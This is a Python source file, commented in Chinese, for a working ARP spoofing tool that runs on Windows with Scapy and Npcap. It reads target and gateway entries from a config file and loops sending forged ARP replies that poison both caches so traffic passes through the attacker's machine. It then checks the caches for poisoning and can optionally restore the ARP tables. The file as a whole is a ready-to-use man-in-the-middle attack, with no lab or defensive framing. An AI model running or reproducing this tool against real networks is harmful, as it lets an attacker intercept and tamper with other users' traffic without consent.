import socket
import psutil
import struct
import time
import re
import toml
import os
import subprocess
import sys
from datetime import datetime

# 导入 Npcap 检测模块
from npcap_checker import check_npcap_before_attack, comprehensive_npcap_check, print_detection_results, install_npcap_guide


# ============================================================
# ARP 工具核心函数
# ============================================================

def run_network_scanner():
    """启动网络扫描器"""
    print("\n🔍 正在扫描网络，更新配置文件...")
    print("=" * 60)
    
    try:
        # 调用 network_scanner.py
        result = subprocess.run(
            [sys.executable, "network_scanner.py"],
            capture_output=False,  # 显示实时输出
            text=True,
            timeout=120  # 最多等待120秒
        )
        return result.returncode == 0
    except subprocess.TimeoutExpired:
        print("❌ 扫描超时")
        return False
    except FileNotFoundError:
        print("❌ 找不到 network_scanner.py")
        return False
    except Exception as e:
        print(f"❌ 运行扫描器失败: {e}")
        return False


def load_config(config_file="config.toml"):
    """加载 TOML 配置文件"""
    try:
        with open(config_file, 'r', encoding='utf-8') as f:
            return toml.load(f)
    except FileNotFoundError:
        print(f"❌ 配置文件 {config_file} 不存在")
        print("请先运行 network_scanner.py 扫描网络")
        return None
    except toml.TomlDecodeError as e:
        print(f"❌ 配置文件格式错误: {e}")
        return None

def toHex(type, data):
    """将 IP 或 MAC 地址转换为字节"""
    if type == 0:  # IP 地址
        parts = data.split('.')
        return bytes([int(part) for part in parts])
    elif type == 1:  # MAC 地址
        mac_clean = data.replace(':', '').replace('-', '').replace('.', '').upper()
        if len(mac_clean) != 12:
            raise ValueError(f"无效的 MAC 地址长度: {mac_clean}")
        return bytes([int(mac_clean[i:i+2], 16) for i in range(0, 12, 2)])
    return b''

def format_mac(mac_str):
    """格式化 MAC 地址为标准格式"""
    if not mac_str or mac_str == "auto":
        return None
    mac_clean = re.sub(r'[:-]', '', mac_str).upper()
    return ':'.join([mac_clean[i:i+2] for i in range(0, 12, 2)])

def create_arp_packet(target_mac, source_mac, opcode, sender_mac, sender_ip, target_ip):
    """创建 ARP 数据包（以太网帧）"""
    eth_header = target_mac + source_mac + b'\x08\x06'
    arp_header = b'\x00\x01\x08\x00\x06\x04' + opcode
    arp_header += sender_mac + sender_ip + target_mac + target_ip
    return eth_header + arp_header

def get_network_info(interface_name="WLAN"):
    """获取网络接口信息"""
    dic = psutil.net_if_addrs()
    for adapter in dic:
        if interface_name in adapter:
            snicList = dic[adapter]
            ipv4 = None
            mac = None
            for snic in snicList:
                if snic.family.name in {'AF_LINK', 'AF_PACKET'}:
                    mac = snic.address
                elif snic.family.name == 'AF_INET':
                    ipv4 = snic.address
            if ipv4 and mac:
                return ipv4, format_mac(mac), adapter
    return None, None, None

def get_mac_from_arp_cache(target_ip):
    """从 ARP 缓存中获取 MAC 地址"""
    try:
        subprocess.run(['ping', target_ip, '-n', '1'], timeout=2, capture_output=True)
        time.sleep(0.5)
        
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=2)
        for line in result.stdout.split('\n'):
            if target_ip in line:
                mac_match = re.search(r'([0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2})', line)
                if mac_match:
                    return format_mac(mac_match.group(1))
    except Exception as e:
        print(f"⚠️  获取 {target_ip} 的 MAC 失败: {e}")
    return None

def send_arp_packet_scapy(arp_packet_bytes, interface="WLAN", verbose=False):
    """
    使用 scapy 发送 ARP 包（真正的以太网帧）
    这是 Windows 下唯一可靠的方式
    """
    try:
        from scapy.all import sendp, Ether
        packet = Ether(arp_packet_bytes)
        # 发送 3 次确保到达
        for _ in range(3):
            sendp(packet, iface=interface, verbose=False)
        return True
    except ImportError:
        if verbose:
            print("❌ Scapy 未安装，请运行: pip install scapy")
            print("   Npcap 也需要正确安装")
        return False
    except Exception as e:
        if verbose:
            print(f"❌ Scapy 发送失败: {e}")
            print("   请确保以管理员权限运行")
        return False

def send_arp_packet_windows_fallback(arp_packet, target_ip, verbose=False):
    """
    备选方案：使用原始套接字（Windows 上实际无法发送 ARP 包）
    仅作为最后的备用尝试
    """
    try:
        raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
        raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        
        ipv4, mac, adapter = get_network_info("WLAN")
        if not ipv4:
            if verbose:
                print("❌ 未找到网络接口")
            return False
        
        raw_socket.bind((ipv4, 0))
        raw_socket.sendto(arp_packet, (target_ip, 0))
        raw_socket.close()
        return True
    except PermissionError:
        if verbose:
            print("❌ 需要管理员权限运行")
        return False
    except Exception as e:
        if verbose:
            print(f"❌ 原始套接字发送失败: {e}")
        return False

def send_arp_packet(arp_packet, target_ip, interface="WLAN", verbose=False):
    """
    发送 ARP 包
    优先使用 Scapy（需要 Npcap），失败时尝试原始套接字
    """
    # 先尝试 Scapy（唯一能在 Windows 下真正发送 ARP 包的方式）
    success = send_arp_packet_scapy(arp_packet, interface, verbose)
    
    if not success:
        if verbose:
            print("⚠️  Scapy 发送失败，尝试原始套接字（可能无效）...")
        success = send_arp_packet_windows_fallback(arp_packet, target_ip, verbose)
        if success and verbose:
            print("⚠️  原始套接字报告成功，但 Windows 下实际可能未发送")
    
    return success

def restore_arp_table(targets, gateway_info, self_info, interface="WLAN", verbose=False):
    """恢复 ARP 表"""
    print("\n🔄 正在恢复 ARP 表...")
    
    self_ip_bytes = toHex(0, self_info['ip'])
    self_mac_bytes = toHex(1, self_info['mac'])
    gateway_ip_bytes = toHex(0, gateway_info['ip'])
    
    for target in targets:
        if not target.get('enabled', True):
            continue
            
        target_ip_bytes = toHex(0, target['ip'])
        
        if target.get('mac') and target['mac'] != 'auto':
            target_mac_bytes = toHex(1, target['mac'])
            # 告诉网关：目标的真实 MAC 是 xxx
            restore_packet = create_arp_packet(
                self_mac_bytes,          # 目标 MAC（网关的 MAC）
                target_mac_bytes,        # 源 MAC（目标的真实 MAC）
                b'\x00\x02',             # ARP 响应
                target_mac_bytes,        # 发送方 MAC（目标的真实 MAC）
                target_ip_bytes,         # 发送方 IP（目标的 IP）
                gateway_ip_bytes         # 目标 IP（网关的 IP）
            )
            send_arp_packet(restore_packet, gateway_info['ip'], interface, verbose)
        
        if gateway_info.get('mac') and gateway_info['mac'] != 'auto':
            gateway_mac_bytes = toHex(1, gateway_info['mac'])
            # 告诉目标：网关的真实 MAC 是 xxx
            restore_packet = create_arp_packet(
                self_mac_bytes,          # 目标 MAC（目标的 MAC）
                gateway_mac_bytes,       # 源 MAC（网关的真实 MAC）
                b'\x00\x02',             # ARP 响应
                gateway_mac_bytes,       # 发送方 MAC（网关的真实 MAC）
                gateway_ip_bytes,        # 发送方 IP（网关的 IP）
                target_ip_bytes          # 目标 IP（目标的 IP）
            )
            send_arp_packet(restore_packet, target['ip'], interface, verbose)
    
    print("✅ ARP 表已恢复")

def arp_spoof_attack(target, gateway, self_info, interface="WLAN", interval=2, verbose=False):
    """对单个目标执行 ARP 欺骗"""
    # 获取或验证目标 MAC
    target_mac = target.get('mac')
    if not target_mac or target_mac == 'auto':
        target_mac = get_mac_from_arp_cache(target['ip'])
        if not target_mac:
            if verbose:
                print(f"⚠️  无法获取 {target['name']} ({target['ip']}) 的 MAC 地址，使用广播 MAC")
            target_mac = "ff:ff:ff:ff:ff:ff"
    
    # 获取或验证网关 MAC
    gateway_mac = gateway.get('mac')
    if not gateway_mac or gateway_mac == 'auto':
        gateway_mac = get_mac_from_arp_cache(gateway['ip'])
        if not gateway_mac:
            if verbose:
                print(f"⚠️  无法获取网关 MAC 地址，使用广播 MAC")
            gateway_mac = "ff:ff:ff:ff:ff:ff"
    
    # 转换地址
    self_ip_bytes = toHex(0, self_info['ip'])
    self_mac_bytes = toHex(1, self_info['mac'])
    target_ip_bytes = toHex(0, target['ip'])
    target_mac_bytes = toHex(1, target_mac)
    gateway_ip_bytes = toHex(0, gateway['ip'])
    gateway_mac_bytes = toHex(1, gateway_mac)
    
    # 欺骗包1: 告诉目标 "网关的 MAC 是攻击者的 MAC"
    packet_to_target = create_arp_packet(
        target_mac_bytes,        # 目标 MAC（目标的 MAC）
        self_mac_bytes,          # 源 MAC（攻击者的 MAC）
        b'\x00\x02',             # ARP 响应
        self_mac_bytes,          # 发送方 MAC（攻击者的 MAC）
        gateway_ip_bytes,        # 发送方 IP（网关的 IP）
        target_ip_bytes          # 目标 IP（目标的 IP）
    )
    
    # 欺骗包2: 告诉网关 "目标的 MAC 是攻击者的 MAC"
    packet_to_gateway = create_arp_packet(
        gateway_mac_bytes,       # 目标 MAC（网关的 MAC）
        self_mac_bytes,          # 源 MAC（攻击者的 MAC）
        b'\x00\x02',             # ARP 响应
        self_mac_bytes,          # 发送方 MAC（攻击者的 MAC）
        target_ip_bytes,         # 发送方 IP（目标的 IP）
        gateway_ip_bytes         # 目标 IP（网关的 IP）
    )
    
    # 发送欺骗包（各发送 3 次确保到达）
    success1 = False
    success2 = False
    
    for i in range(3):
        if send_arp_packet(packet_to_target, target['ip'], interface, verbose):
            success1 = True
        if send_arp_packet(packet_to_gateway, gateway['ip'], interface, verbose):
            success2 = True
        time.sleep(0.1)
    
    if success1 and success2:
        if verbose:
            print(f"✅ {target['name']} ({target['ip']}) 欺骗成功")
        return True
    else:
        if verbose:
            print(f"❌ {target['name']} ({target['ip']}) 欺骗失败")
        return False

def verify_arp_cache(target_ip, gateway_ip, self_mac):
    """验证 ARP 缓存是否被污染"""
    print("\n🔍 验证 ARP 缓存状态:")
    
    result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
    
    target_mac = None
    gateway_mac = None
    
    for line in result.stdout.split('\n'):
        if target_ip in line:
            mac_match = re.search(r'([0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2})', line)
            if mac_match:
                target_mac = format_mac(mac_match.group(1))
                if target_mac == self_mac:
                    print(f"  ✅ 目标 ({target_ip}) 的 MAC 已被篡改为攻击者 MAC: {target_mac}")
                else:
                    print(f"  ❌ 目标 ({target_ip}) 的 MAC 未被篡改: {target_mac}")
        
        if gateway_ip in line:
            mac_match = re.search(r'([0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2}[:-][0-9A-Fa-f]{2})', line)
            if mac_match:
                gateway_mac = format_mac(mac_match.group(1))
                if gateway_mac == self_mac:
                    print(f"  ✅ 网关 ({gateway_ip}) 的 MAC 已被篡改为攻击者 MAC: {gateway_mac}")
                else:
                    print(f"  ❌ 网关 ({gateway_ip}) 的 MAC 未被篡改: {gateway_mac}")

# ============================================================
# 主程序
# ============================================================

if __name__ == "__main__":
    print("=" * 60)
    print("🎯 ARP 欺骗工具 v3.0 (Scapy + Npcap 版)")
    print("=" * 60)
    
    # 1. 检测 Npcap
    if not check_npcap_before_attack(ask_user=True):
        print("❌ Npcap 未正确安装，程序无法正常工作")
        print("请安装 Npcap 后重试")
        sys.exit(1)

    # ===== 新增：自动运行网络扫描器 =====
    if run_network_scanner():
        print("\n✅ 网络扫描完成，配置文件已更新")
    else:
        print("\n⚠️  网络扫描失败，使用现有配置文件")
    # ===================================
    
    # 2. 加载配置文件
    config = load_config()
    if not config:
        print("❌ 配置文件加载失败")
        sys.exit(1)
    
    # 3. 获取本机网络信息
    interface = config['settings'].get('interface', 'WLAN')
    verbose = config['settings'].get('verbose', False)
    ipv4_self_str, mac_self_str, adapter = get_network_info(interface)
    
    if not ipv4_self_str or not mac_self_str:
        print(f"❌ 未找到接口: {interface}")
        print("\n可用接口:")
        dic = psutil.net_if_addrs()
        for adapter_name in dic:
            for snic in dic[adapter_name]:
                if snic.family.name == 'AF_INET':
                    print(f"  - {adapter_name}: {snic.address}")
        sys.exit(1)
    
    print(f"\n✅ 本机信息:")
    print(f"  接口: {adapter}")
    print(f"  IP: {ipv4_self_str}")
    print(f"  MAC: {mac_self_str}")
    
    self_info = {
        'ip': ipv4_self_str,
        'mac': mac_self_str
    }
    
    # 4. 获取网关信息
    gateway = config['gateway']
    gateway_ip = gateway.get('ip')
    gateway_mac = gateway.get('mac')
    
    if not gateway_ip:
        print("❌ 配置文件中缺少网关 IP")
        sys.exit(1)
    
    print(f"\n🌐 网关信息:")
    print(f"  IP: {gateway_ip}")
    if gateway_mac and gateway_mac != 'auto':
        print(f"  MAC: {gateway_mac}")
    else:
        print(f"  MAC: 自动获取")
    
    # 5. 获取目标列表
    targets = config.get('targets', [])
    enabled_targets = [t for t in targets if t.get('enabled', True)]
    
    if not enabled_targets:
        print("❌ 没有启用的目标")
        sys.exit(1)
    
    print(f"\n🎯 目标列表 (共 {len(enabled_targets)} 个):")
    for target in enabled_targets:
        mac_display = target.get('mac', 'auto')
        print(f"  - {target.get('name', '未命名')}: {target['ip']} (MAC: {mac_display})")
    
    # 6. 获取设置
    interval = config['settings'].get('interval', 2)
    duration = config['settings'].get('duration', 0)
    auto_recovery = config['settings'].get('auto_recovery', True)
    
    print(f"\n⚙️  设置:")
    print(f"  发送间隔: {interval} 秒")
    print(f"  持续时间: {'无限' if duration == 0 else f'{duration} 秒'}")
    print(f"  自动恢复: {'开启' if auto_recovery else '关闭'}")
    print(f"  详细模式: {'开启' if verbose else '关闭'}")
    
    print("\n" + "=" * 60)
    print("开始 ARP 欺骗攻击...")
    print("按 Ctrl+C 停止攻击")
    print("=" * 60)
    
    # 7. 执行 ARP 欺骗
    try:
        count = 0
        start_time = time.time()
        
        # 攻击前验证 ARP 缓存
        verify_arp_cache(enabled_targets[0]['ip'], gateway_ip, mac_self_str)
        
        while True:
            count += 1
            current_time = time.time() - start_time
            
            # 检查是否超过持续时间
            if duration > 0 and current_time > duration:
                print(f"\n⏰ 达到设定的持续时间 ({duration} 秒)，停止攻击")
                break
            
            print(f"\n🔄 第 {count} 轮攻击 (已运行 {int(current_time)}s)")
            
            success_count = 0
            for target in enabled_targets:
                success = arp_spoof_attack(target, gateway, self_info, adapter, interval, verbose)
                if success:
                    success_count += 1
            
            print(f"📊 本轮结果: {success_count}/{len(enabled_targets)} 成功")
            
            # 每 5 轮验证一次 ARP 缓存
            if count % 5 == 0:
                verify_arp_cache(enabled_targets[0]['ip'], gateway_ip, mac_self_str)
            
            time.sleep(interval)
            
    except KeyboardInterrupt:
        print("\n\n⏹️  用户中断攻击")
    
    # 8. 恢复 ARP 表
    if auto_recovery:
        restore_arp_table(enabled_targets, gateway, self_info, adapter, verbose)
    else:
        print("\n⚠️  注意: 未恢复 ARP 表，目标设备可能需要重启网络连接")
    
    print("\n" + "=" * 60)
    print("🏁 程序结束")
    print("=" * 60)
